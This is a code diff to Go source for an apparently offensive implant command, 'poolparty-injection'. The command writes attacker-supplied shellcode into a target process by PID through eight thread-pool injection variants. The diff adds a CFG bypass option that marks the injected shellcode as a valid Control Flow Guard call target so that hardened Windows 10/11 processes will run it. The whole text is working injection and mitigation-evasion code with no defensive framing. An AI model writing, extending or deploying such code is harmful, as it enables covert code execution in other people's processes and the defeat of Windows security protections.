@@ -48,7 +48,8 @@ type PoolPartyInjectionParams struct {
 	ShellcodeB64 string `json:"shellcode_b64"`
 	PID          int    `json:"pid"`
 	Variant      int    `json:"variant"`
-	Target       string `json:"target"` // "auto", "auto-elevated", "auto-user"
+	Target       string `json:"target"`    // "auto", "auto-elevated", "auto-user"
+	CFGBypass    bool   `json:"cfg_bypass"` // Mark shellcode as valid CFG target (variants 2-8)
 }
 
 // Execute executes the poolparty-injection command
@@ -97,21 +98,22 @@ func (c *PoolPartyInjectionCommand) Execute(task structs.Task) structs.CommandRe
 	var output string
 	switch params.Variant {
 	case 1:
+		// Variant 1 writes to an existing valid CFG target (StartRoutine); no CFG bypass needed.
 		output, err = executeVariant1(shellcode, uint32(params.PID))
 	case 2:
-		output, err = executeVariant2(shellcode, uint32(params.PID))
+		output, err = executeVariant2(shellcode, uint32(params.PID), params.CFGBypass)
 	case 3:
-		output, err = executeVariant3(shellcode, uint32(params.PID))
+		output, err = executeVariant3(shellcode, uint32(params.PID), params.CFGBypass)
 	case 4:
-		output, err = executeVariant4(shellcode, uint32(params.PID))
+		output, err = executeVariant4(shellcode, uint32(params.PID), params.CFGBypass)
 	case 5:
-		output, err = executeVariant5(shellcode, uint32(params.PID))
+		output, err = executeVariant5(shellcode, uint32(params.PID), params.CFGBypass)
 	case 6:
-		output, err = executeVariant6(shellcode, uint32(params.PID))
+		output, err = executeVariant6(shellcode, uint32(params.PID), params.CFGBypass)
 	case 7:
-		output, err = executeVariant7(shellcode, uint32(params.PID))
+		output, err = executeVariant7(shellcode, uint32(params.PID), params.CFGBypass)
 	case 8:
-		output, err = executeVariant8(shellcode, uint32(params.PID))
+		output, err = executeVariant8(shellcode, uint32(params.PID), params.CFGBypass)
 	default:
 		return errorf("Error: Unsupported variant %d", params.Variant)
 	}
@@ -147,13 +149,23 @@ func poolPartyInit(variant int, desc string, shellcode []byte, pid uint32) (uint
 }
 
 // poolPartyAllocShellcode allocates, writes, and protects shellcode in the target process.
+// If cfgBypass is true, it marks the allocation as a valid CFG call target so that
+// hardened processes (Windows 10/11 with CFG) can execute the shellcode via callbacks.
 // Returns the remote shellcode address and appends to output.
-func poolPartyAllocShellcode(hProcess uintptr, shellcode []byte, output string) (uintptr, string, error) {
+func poolPartyAllocShellcode(hProcess uintptr, shellcode []byte, output string, cfgBypass bool) (uintptr, string, error) {
 	addr, err := injectAllocWriteProtect(hProcess, shellcode, PAGE_EXECUTE_READ)
 	if err != nil {
 		return 0, output, fmt.Errorf("shellcode injection failed: %w", err)
 	}
 	output += fmt.Sprintf("[+] Shellcode at: 0x%X (W^X: RW→RX)\n", addr)
+	if cfgBypass {
+		if cfgErr := cfgBypassApplyToTarget(hProcess, addr, len(shellcode)); cfgErr != nil {
+			// Non-fatal: CFG may not be enabled on this target process; log and continue.
+			output += fmt.Sprintf("[*] CFG bypass attempted but not required/available: %v\n", cfgErr)
+		} else {
+			output += "[+] CFG bypass applied: shellcode marked as valid call target\n"
+		}
+	}
 	return addr, output, nil
 }
 func hijackProcessHandle(hProcess uintptr, objectType string, desiredAccess uint32) (windows.Handle, error) {
